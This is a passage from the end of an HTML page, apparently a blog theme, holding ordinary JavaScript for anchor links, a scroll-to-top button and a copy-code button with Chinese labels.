                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
